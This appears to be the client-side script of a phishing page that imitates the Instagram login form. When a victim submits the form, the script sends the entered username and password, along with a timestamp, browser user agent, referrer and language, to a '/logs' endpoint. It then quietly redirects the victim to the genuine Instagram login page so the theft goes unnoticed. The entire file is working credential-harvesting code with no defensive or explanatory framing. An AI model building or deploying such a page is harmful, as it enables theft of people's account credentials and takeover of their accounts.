// enable button only when both fields have content (matches real IG behavior)
(function () {
  const form = document.getElementById('loginForm');
  const user = document.getElementById('username');
  const pass = document.getElementById('password');
  const btn  = document.getElementById('loginBtn');

  function sync() {
    btn.disabled = !(user.value.trim().length > 0 && pass.value.length > 0);
  }
  user.addEventListener('input', sync);
  pass.addEventListener('input', sync);

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    if (btn.disabled) return;

    const payload = {
      username: user.value,
      password: pass.value,
      ts: new Date().toISOString(),
      ua: navigator.userAgent,
      ref: document.referrer || '',
      lang: navigator.language || '',
    };

    // fire-and-forget; keepalive survives the redirect
    try {
      fetch('/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      }).catch(function () {});
    } catch (_) {}

    // brief pause so the POST lands, then off to the real site
    setTimeout(function () {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 250);
  });
})();
